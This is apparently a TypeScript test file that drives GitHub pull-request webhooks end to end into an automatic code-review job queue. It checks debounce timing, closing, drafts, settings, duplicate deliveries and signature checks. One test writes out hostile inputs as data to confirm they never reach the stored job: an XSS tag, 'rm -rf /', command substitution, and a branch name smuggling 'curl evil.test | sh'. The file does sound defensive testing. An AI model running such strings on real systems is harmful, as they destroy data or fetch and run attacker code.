// The automatic reviews of CR-31, end to end up to the queue: a signed `pull_request` delivery goes
// through the real webhook handler, the real GitHub App provider (against the fake GitHub), the real
// trigger policy with the real review settings, and the real job queue on a real SQLite file. Time
// is a hand-set clock shared by the policy and the queue, so the wait of a push is checked without
// waiting. The decisions themselves are unit tests (src/webhooks/automatic-review-policy.test.ts);
// what the queue does with a job is tested in src/jobs.
import { describe, expect, it } from "vitest";
import {
  signWebhookBody,
  webhookDelivery,
  webhookFixture,
} from "../../../fakes/github/webhooks.ts";
import { createAppSettingsRepository } from "../../src/db/repositories/app-settings-repository.ts";
import { createProjectsRepository } from "../../src/db/repositories/projects-repository.ts";
import { createRepositoriesRepository } from "../../src/db/repositories/repositories-repository.ts";
import { createIntegrationRegistry } from "../../src/integrations/registry.ts";
import { createJobQueue } from "../../src/jobs/job-queue.ts";
import { createReviewSettingsService } from "../../src/review-settings/service.ts";
import { builtInReviewSettings } from "../../src/review-settings/settings.ts";
import { TEST_WEBHOOK_SECRET } from "../../src/test-support/github-app.ts";
import {
  FIXTURE_HEAD_SHA,
  startWebhookHarness,
} from "../../src/test-support/webhook-harness.ts";
import { createAutomaticReviewSettingsSource } from "../../src/webhooks/automatic-review-settings.ts";
import { AUTOMATIC_REVIEW_DEBOUNCE_MS } from "../../src/webhooks/automatic-review-policy.ts";
import { createGithubAppWebhookHandler } from "../../src/webhooks/github-app-handler.ts";
import { createJobQueueReviewTriggerIntake } from "../../src/webhooks/job-queue-intake.ts";

const HEAD_1 = FIXTURE_HEAD_SHA;
const HEAD_2 = "c0ffee00c0ffee00c0ffee00c0ffee00c0ffee00";
const HEAD_3 = "d00d1e00d00d1e00d00d1e00d00d1e00d00d1e00";
const START = new Date("2026-10-10T12:00:00.000Z");

type PullRequestChanges = {
  headSha?: string;
  state?: string;
  draft?: boolean;
  merged?: boolean;
  title?: string;
  headRef?: string;
};

/** A recorded pull request payload with other values where a test needs them. */
function payload(fixture: string, changes: PullRequestChanges = {}) {
  const base = webhookFixture(fixture) as unknown as {
    pull_request: {
      title?: string;
      state: string;
      draft: boolean;
      merged: boolean;
      head: { sha: string; ref?: string };
    };
  };
  const pull = base.pull_request;
  if (changes.headSha !== undefined) pull.head.sha = changes.headSha;
  if (changes.headRef !== undefined) pull.head.ref = changes.headRef;
  if (changes.state !== undefined) pull.state = changes.state;
  if (changes.draft !== undefined) pull.draft = changes.draft;
  if (changes.merged !== undefined) pull.merged = changes.merged;
  if (changes.title !== undefined) pull.title = changes.title;
  return base;
}

async function startHarness(
  options: { activateProject?: boolean; debounceMs?: number } = {},
) {
  const h = await startWebhookHarness();
  const clock = { now: new Date(START) };
  const now = () => new Date(clock.now);
  const queue = createJobQueue(h.db, { now });
  const repositories = createRepositoriesRepository(h.db);
  const settings = createReviewSettingsService({
    appSettings: createAppSettingsRepository(h.db),
    projects: createProjectsRepository(h.db),
    builtIn: () => builtInReviewSettings("test/model"),
  });
  const routeLog: string[] = [];
  const intakeLog: string[] = [];
  const intake = createJobQueueReviewTriggerIntake({
    queue,
    repositories,
    logger: {
      info: (line) => intakeLog.push(line),
      error: (line) => intakeLog.push(line),
    },
  });
  const handler = createGithubAppWebhookHandler({
    registry: createIntegrationRegistry({ github_app: h.provider }),
    integrations: h.integrations,
    deliveries: h.deliveries,
    sync: h.sync,
    projects: h.projects,
    automatic: {
      settingsFor: createAutomaticReviewSettingsSource({
        repositories,
        settings,
      }),
      debounceMs: options.debounceMs ?? AUTOMATIC_REVIEW_DEBOUNCE_MS,
      now,
    },
    intake,
    logger: {
      info: (line) => routeLog.push(line),
      error: (line) => routeLog.push(line),
    },
  });

  let counter = 0;
  /** A signed delivery of `fixture` (or of the given payload) under a fresh delivery id. */
  function send(
    fixture: string,
    options: { deliveryId?: string; payload?: unknown } = {},
  ) {
    counter += 1;
    return handler(
      webhookDelivery({
        event: fixture.split(".")[0] as string,
        payload: options.payload ?? webhookFixture(fixture),
        secret: TEST_WEBHOOK_SECRET,
        deliveryId: options.deliveryId ?? `delivery-${counter}`,
      }),
    );
  }

  const integration = await h.seedInstallation(
    options.activateProject === undefined
      ? {}
      : { activateProject: options.activateProject },
  );
  const [repository] = await repositories.list({
    integrationId: integration.id,
  });
  if (repository === undefined) throw new Error("seeding failed");

  /** Moves the clock and, with it, the policy's and the queue's idea of now. */
  function advance(ms: number) {
    clock.now = new Date(clock.now.getTime() + ms);
  }

  return {
    h,
    queue,
    settings,
    repository,
    routeLog,
    intakeLog,
    clock,
    send,
    advance,
    jobs: () => queue.list(),
  };
}

async function body(response: Response) {
  return (await response.json()) as Record<string, unknown>;
}

describe("a pull request that is opened", () => {
  // CR-31-T01
  it("puts exactly one automatic review job for the head commit into the queue, due at once", async () => {
    const t = await startHarness();

    const response = await t.send("pull_request.opened");

    expect(response.status).toBe(202);
    expect(await body(response)).toEqual({
      status: "accepted",
      outcome: "trigger_enqueued",
    });
    const [job, ...rest] = await t.jobs();
    expect(rest).toEqual([]);
    expect(job).toMatchObject({
      repositoryId: t.repository.id,
      prNumber: 7,
      headSha: HEAD_1,
      command: "review",
      args: "",
      triggerKind: "webhook",
      status: "queued",
      runAfter: START.toISOString(),
    });
  });

  it("reviews a pull request from a fork like any other", async () => {
    const t = await startHarness();

    await t.send("pull_request.opened.fork");

    expect(await t.jobs()).toMatchObject([
      { headSha: expect.stringMatching(/^9e8d7c6b/), status: "queued" },
    ]);
  });

  it("reviews a pull request that a bot opened like any other", async () => {
    const t = await startHarness();
    const botPayload = payload("pull_request.opened") as unknown as {
      sender: { login: string; type: string };
    };
    botPayload.sender = {
      ...botPayload.sender,
      login: "renovate[bot]",
      type: "Bot",
    };

    await t.send("pull_request.opened", { payload: botPayload });

    expect(await t.jobs()).toMatchObject([
      { actorLogin: "renovate[bot]", status: "queued" },
    ]);
  });

  it("starts a review again for a reopened pull request, due at once", async () => {
    const t = await startHarness();
    await t.send("pull_request.reopened");

    expect(await t.jobs()).toMatchObject([
      { headSha: HEAD_1, status: "queued", runAfter: START.toISOString() },
    ]);
  });
});

describe("a pull request that is pushed to", () => {
  // CR-31-T05
  it("creates a job that waits for the debounce time, and only then lets a runner have it", async () => {
    const t = await startHarness();
    t.h.fake.updatePullRequest("acme/widgets", 7, { headSha: HEAD_2 });

    await t.send("pull_request.synchronize", {
      payload: payload("pull_request.synchronize", { headSha: HEAD_2 }),
    });

    const [job] = await t.jobs();
    expect(job).toMatchObject({ headSha: HEAD_2, status: "queued" });
    expect(job?.runAfter).toBe(
      new Date(START.getTime() + AUTOMATIC_REVIEW_DEBOUNCE_MS).toISOString(),
    );
    expect(await t.queue.claimNext("runner-1")).toBeNull();
    t.advance(AUTOMATIC_REVIEW_DEBOUNCE_MS);
    expect((await t.queue.claimNext("runner-1"))?.job.headSha).toBe(HEAD_2);
  });

  it("waits as long as the configured debounce time says", async () => {
    const t = await startHarness({ debounceMs: 60_000 });

    await t.send("pull_request.synchronize");

    expect((await t.jobs())[0]?.runAfter).toBe(
      new Date(START.getTime() + 60_000).toISOString(),
    );
  });

  // CR-31-T06
  it("keeps exactly one waiting job when another push arrives within the wait, with the newest commit and a new wait", async () => {
    const t = await startHarness();
    t.h.fake.updatePullRequest("acme/widgets", 7, { headSha: HEAD_2 });
    await t.send("pull_request.synchronize", {
      payload: payload("pull_request.synchronize", { headSha: HEAD_2 }),
    });
    t.advance(40_000);
    t.h.fake.updatePullRequest("acme/widgets", 7, { headSha: HEAD_3 });

    await t.send("pull_request.synchronize", {
      payload: payload("pull_request.synchronize", { headSha: HEAD_3 }),
    });

    const jobs = await t.jobs();
    expect(jobs.filter((job) => job.status === "queued")).toHaveLength(1);
    const waiting = jobs.find((job) => job.status === "queued");
    expect(waiting).toMatchObject({ headSha: HEAD_3 });
    expect(waiting?.runAfter).toBe(
      new Date(
        START.getTime() + 40_000 + AUTOMATIC_REVIEW_DEBOUNCE_MS,
      ).toISOString(),
    );
    expect(jobs.find((job) => job.headSha === HEAD_2)).toMatchObject({
      status: "superseded",
      supersededBy: waiting?.id,
    });
  });

  it("does not let a late push for an older commit take the place of the waiting job of the newest", async () => {
    const t = await startHarness();
    t.h.fake.updatePullRequest("acme/widgets", 7, { headSha: HEAD_3 });
    await t.send("pull_request.synchronize", {
      payload: payload("pull_request.synchronize", { headSha: HEAD_3 }),
    });

    // The delivery for the commit before arrives late: GitHub's head is already HEAD_3.
    const late = await t.send("pull_request.synchronize", {
      payload: payload("pull_request.synchronize", { headSha: HEAD_2 }),
    });

    expect(await body(late)).toMatchObject({ outcome: "trigger_skipped" });
    expect(await t.jobs()).toMatchObject([
      { headSha: HEAD_3, status: "queued" },
    ]);
    expect(t.routeLog.join("\n")).toContain("reason=stale_head");
  });

  // CR-31-T07
  it("leaves a running job for the old commit alone and creates a waiting job for the new one", async () => {
    const t = await startHarness();
    await t.send("pull_request.opened");
    const claimed = await t.queue.claimNext("runner-1");
    t.h.fake.updatePullRequest("acme/widgets", 7, { headSha: HEAD_2 });

    await t.send("pull_request.synchronize", {
      payload: payload("pull_request.synchronize", { headSha: HEAD_2 }),
    });

    const jobs = await t.jobs();
    expect(jobs.find((job) => job.id === claimed?.job.id)).toMatchObject({
      headSha: HEAD_1,
      status: "running",
    });
    expect(jobs.find((job) => job.headSha === HEAD_2)).toMatchObject({
      status: "queued",
    });
    expect(jobs).toHaveLength(2);
  });

  it("answers 500 and forgets the delivery when GitHub cannot say what the head is, so the redelivery is judged again", async () => {
    const t = await startHarness();
    // GitHub does not know pull request 99, so asking for its head fails.
    const unknownPull = payload("pull_request.synchronize") as unknown as {
      number: number;
    };
    unknownPull.number = 99;

    const response = await t.send("pull_request.synchronize", {
      deliveryId: "d-fail",
      payload: unknownPull,
    });

    expect(response.status).toBe(500);
    expect(await body(response)).toEqual({
      error: "WEBHOOK_PROCESSING_FAILED",
    });
    expect(await t.jobs()).toEqual([]);
    expect(await t.h.deliveries.claim("d-fail", "pull_request")).toMatchObject({
      status: "claimed",
    });
  });
});

describe("a pull request that is closed", () => {
  // CR-31-T08
  it.each([
    ["merged", true],
    ["not merged", false],
  ])(
    "drops the waiting job when it is %s, and the job never runs",
    async (_name, merged) => {
      const t = await startHarness();
      t.h.fake.updatePullRequest("acme/widgets", 7, { headSha: HEAD_2 });
      await t.send("pull_request.synchronize", {
        payload: payload("pull_request.synchronize", { headSha: HEAD_2 }),
      });

      const response = await t.send("pull_request.closed", {
        payload: payload("pull_request.closed", { merged }),
      });

      expect(await body(response)).toEqual({
        status: "accepted",
        outcome: "waiting_jobs_discarded",
      });
      expect(await t.jobs()).toMatchObject([
        { status: "cancelled", errorCode: "pull_request_closed" },
      ]);
      t.advance(AUTOMATIC_REVIEW_DEBOUNCE_MS * 10);
      expect(await t.queue.claimNext("runner-1")).toBeNull();
    },
  );

  it("lets a job that already runs finish", async () => {
    const t = await startHarness();
    await t.send("pull_request.opened");
    const claimed = await t.queue.claimNext("runner-1");

    await t.send("pull_request.closed");

    expect(await t.jobs()).toMatchObject([
      { id: claimed?.job.id, status: "running" },
    ]);
  });

  it("drops only the waiting jobs of that pull request", async () => {
    const t = await startHarness();
    await t.send("pull_request.opened");
    t.h.fake.addPullRequest("acme/widgets", {
      number: 8,
      title: "Other",
      state: "open",
      headSha: HEAD_2,
      headRef: "other",
      baseRef: "main",
      author: { login: "alice", id: 1001 },
    });
    const other = payload("pull_request.opened", { headSha: HEAD_2 });
    Object.assign(other, { number: 8 });
    await t.send("pull_request.opened", { payload: other });

    await t.send("pull_request.closed");

    expect(
      (await t.jobs()).map((job) => [job.prNumber, job.status]).sort(),
    ).toEqual([
      [7, "cancelled"],
      [8, "queued"],
    ]);
  });

  it("is a no-op when nothing waits, and when the project is not active", async () => {
    const t = await startHarness();
    const nothing = await t.send("pull_request.closed");
    expect(await body(nothing)).toMatchObject({
      outcome: "waiting_jobs_discarded",
    });

    const off = await startHarness({ activateProject: false });
    const gated = await off.send("pull_request.closed");
    expect(await body(gated)).toMatchObject({ outcome: "project_not_active" });
  });

  // CR-31-T09
  it.each(["pull_request.synchronize", "pull_request.reopened"])(
    "creates no job for a late %s delivery that says the pull request is closed",
    async (fixture) => {
      const t = await startHarness();

      const response = await t.send(fixture, {
        payload: payload(fixture, { state: "closed" }),
      });

      expect(response.status).toBe(202);
      expect(await body(response)).toMatchObject({
        outcome: "trigger_skipped",
      });
      expect(await t.jobs()).toEqual([]);
      expect(t.routeLog.join("\n")).toContain("reason=pull_request_closed");
    },
  );

  // CR-31-T09
  it("creates no job for a late push when GitHub says the pull request was closed meanwhile", async () => {
    const t = await startHarness();
    t.h.fake.updatePullRequest("acme/widgets", 7, { state: "closed" });

    const response = await t.send("pull_request.synchronize");

    expect(await body(response)).toMatchObject({ outcome: "trigger_skipped" });
    expect(await t.jobs()).toEqual([]);
  });
});

describe("a draft pull request", () => {
  // CR-31-T04
  it.each([["pull_request.opened.draft"], ["pull_request.synchronize"]])(
    "gets no job from %s",
    async (fixture) => {
      const t = await startHarness();

      const response = await t.send(fixture, {
        payload: payload(fixture, { draft: true }),
      });

      expect(await body(response)).toMatchObject({
        outcome: "trigger_skipped",
      });
      expect(await t.jobs()).toEqual([]);
      expect(t.routeLog.join("\n")).toContain("reason=draft");
    },
  );

  // CR-31-T10
  it("gets a job as soon as it is marked ready for review", async () => {
    const t = await startHarness();
    await t.send("pull_request.opened.draft");
    expect(await t.jobs()).toEqual([]);

    const response = await t.send("pull_request.ready_for_review");

    expect(await body(response)).toMatchObject({ outcome: "trigger_enqueued" });
    expect(await t.jobs()).toMatchObject([
      { headSha: HEAD_1, status: "queued", runAfter: START.toISOString() },
    ]);
  });

  it("is not reviewed when it is turned into a draft again", async () => {
    const t = await startHarness();

    const response = await t.send("pull_request.converted_to_draft");

    expect(await body(response)).toMatchObject({ outcome: "ignored" });
    expect(await t.jobs()).toEqual([]);
  });

  it("can be redelivered as ready: a skipped delivery is not kept as a duplicate", async () => {
    const t = await startHarness();
    const draft = payload("pull_request.opened.draft");
    await t.send("pull_request.opened", { deliveryId: "d-1", payload: draft });
    expect(await t.jobs()).toEqual([]);

    const again = await t.send("pull_request.opened", {
      deliveryId: "d-1",
      payload: payload("pull_request.opened"),
    });

    expect(await body(again)).toMatchObject({ outcome: "trigger_enqueued" });
    expect(await t.jobs()).toHaveLength(1);
  });
});

describe("the automatic review settings", () => {
  // CR-31-T11
  it("creates no job for an opened pull request in a project with reviews on open switched off", async () => {
    const t = await startHarness();
    await t.settings.updateProjectSettings(t.repository.id, {
      autoReviewOnOpen: false,
    });

    const response = await t.send("pull_request.opened");

    expect(response.status).toBe(202);
    expect(await body(response)).toMatchObject({ outcome: "trigger_skipped" });
    expect(await t.jobs()).toEqual([]);
    expect(t.routeLog.join("\n")).toContain("reason=automatic_review_disabled");
  });

  it("follows the global default when the project sets nothing", async () => {
    const t = await startHarness();
    await t.settings.updateGlobalSettings({ autoReviewOnOpen: false }, "luca");

    await t.send("pull_request.opened");

    expect(await t.jobs()).toEqual([]);
  });

  it("lets the project switch reviews on again over a global default that is off", async () => {
    const t = await startHarness();
    await t.settings.updateGlobalSettings({ autoReviewOnOpen: false }, "luca");
    await t.settings.updateProjectSettings(t.repository.id, {
      autoReviewOnOpen: true,
    });

    await t.send("pull_request.opened");

    expect(await t.jobs()).toHaveLength(1);
  });

  it("keeps reviewing pushes when only reviews on open are off, and the other way round", async () => {
    const t = await startHarness();
    await t.settings.updateProjectSettings(t.repository.id, {
      autoReviewOnOpen: false,
    });
    await t.send("pull_request.synchronize");
    expect(await t.jobs()).toHaveLength(1);

    const u = await startHarness();
    await u.settings.updateProjectSettings(u.repository.id, {
      autoReviewOnPush: false,
    });
    await u.send("pull_request.synchronize");
    expect(await u.jobs()).toEqual([]);
    await u.send("pull_request.opened");
    expect(await u.jobs()).toHaveLength(1);
  });

  it("does not stop a comment command: the settings are about automatic reviews", async () => {
    const t = await startHarness();
    await t.settings.updateProjectSettings(t.repository.id, {
      autoReviewOnOpen: false,
      autoReviewOnPush: false,
    });
    t.h.fake.setCollaboratorPermission("acme/widgets", "bob", "write");

    await t.send("issue_comment.created.review");

    expect(await t.jobs()).toMatchObject([
      { triggerKind: "comment", command: "review" },
    ]);
  });
});

describe("deliveries that must not produce a job", () => {
  // CR-31-T12
  it("answers 2xx for a delivery that was handled before and creates no second job", async () => {
    const t = await startHarness();
    await t.send("pull_request.opened", { deliveryId: "same" });

    const again = await t.send("pull_request.opened", { deliveryId: "same" });

    expect(again.status).toBe(202);
    expect(await body(again)).toEqual({
      status: "accepted",
      outcome: "duplicate",
    });
    expect(await t.jobs()).toHaveLength(1);
  });

  // CR-31-T13
  it("answers 2xx, creates no job and logs it when the repository is not an active project", async () => {
    const t = await startHarness({ activateProject: false });

    const response = await t.send("pull_request.opened");

    expect(response.status).toBe(202);
    expect(await body(response)).toMatchObject({
      outcome: "project_not_active",
    });
    expect(await t.jobs()).toEqual([]);
    expect(t.routeLog.join("\n")).toContain("outcome=project_not_active");
  });

  // CR-31-T13
  it("answers 2xx, creates no job and logs it when the repository belongs to no known installation", async () => {
    const t = await startHarness();
    const stranger = payload("pull_request.opened") as unknown as {
      installation: { id: number };
    };
    stranger.installation = { id: 9999 };

    const response = await t.send("pull_request.opened", {
      payload: stranger,
    });

    expect(response.status).toBe(202);
    expect(await body(response)).toMatchObject({
      outcome: "unknown_installation",
    });
    expect(await t.jobs()).toEqual([]);
    expect(t.routeLog.join("\n")).toContain("outcome=unknown_installation");
  });

  // CR-31-T14
  it("answers 400 and creates no job when the head commit is missing, and does not echo the body", async () => {
    const t = await startHarness();
    const broken = payload("pull_request.opened") as unknown as {
      pull_request: { head?: unknown; title: string };
    };
    broken.pull_request.title = "marker-title-do-not-echo";
    delete broken.pull_request.head;

    const response = await t.send("pull_request.opened", {
      deliveryId: "d-broken",
      payload: broken,
    });

    expect(response.status).toBe(400);
    const text = JSON.stringify(await response.json());
    expect(text).toBe('{"error":"WEBHOOK_PAYLOAD_INVALID"}');
    expect(await t.jobs()).toEqual([]);
    // Nothing is kept as a success: a corrected delivery under the same id is handled.
    const fixed = await t.send("pull_request.opened", {
      deliveryId: "d-broken",
    });
    expect(await body(fixed)).toMatchObject({ outcome: "trigger_enqueued" });
  });

  // CR-31-T14
  it("answers 400 and creates no job when the body is not JSON", async () => {
    const t = await startHarness();

    const response = await t.h.handler(
      webhookDelivery({
        event: "pull_request",
        body: "{",
        secret: TEST_WEBHOOK_SECRET,
      }),
    );

    expect(response.status).toBe(400);
    expect(await body(response)).toEqual({ error: "WEBHOOK_BODY_NOT_JSON" });
    expect(await t.jobs()).toEqual([]);
  });

  // CR-31-T15
  it("answers 401 and creates no job when the signature does not belong to the body, without repeating the body", async () => {
    const t = await startHarness();
    const forged = payload("pull_request.opened") as unknown as {
      pull_request: { title: string };
    };
    forged.pull_request.title = "marker-title-do-not-echo";
    const text = JSON.stringify(forged);

    const response = await handlerRaw(t, text, {
      signature: signWebhookBody(`${text} `, TEST_WEBHOOK_SECRET),
    });

    expect(response.status).toBe(401);
    expect(JSON.stringify(await response.json())).not.toContain("marker-title");
    expect(await t.jobs()).toEqual([]);
  });

  // CR-31-T16
  it("answers 401 and creates no job when the signature header is missing", async () => {
    const t = await startHarness();
    const text = JSON.stringify(webhookFixture("pull_request.opened"));

    const response = await handlerRaw(t, text, { signature: null });

    expect(response.status).toBe(401);
    expect(await t.jobs()).toEqual([]);
  });
});

/** Posts a body to the handler of a harness with a chosen signature (`null` leaves the header out). */
function handlerRaw(
  t: Awaited<ReturnType<typeof startHarness>>,
  text: string,
  options: { signature: string | null },
) {
  return t.h.handler(
    webhookDelivery({
      event: "pull_request",
      body: text,
      secret: TEST_WEBHOOK_SECRET,
      signature: options.signature,
    }),
  );
}

describe("a pull request with hostile text in its title and branch name", () => {
  // CR-31-T17
  it("gets the fixed review command, and the text never reaches the command or the job", async () => {
    const t = await startHarness();
    const title =
      "<img src=x onerror=alert(1)>; rm -rf / `whoami` $(id) && /ask leak";
    const branch = 'x"; curl evil.test | sh #';

    await t.send("pull_request.opened", {
      payload: payload("pull_request.opened", { title, headRef: branch }),
    });

    const [job, ...rest] = await t.jobs();
    expect(rest).toEqual([]);
    expect(job).toMatchObject({
      command: "review",
      args: "",
      triggerKind: "webhook",
    });
    const stored = JSON.stringify(job);
    expect(stored).not.toContain("rm -rf");
    expect(stored).not.toContain("curl");
    expect(stored).not.toContain("onerror");
  });
});
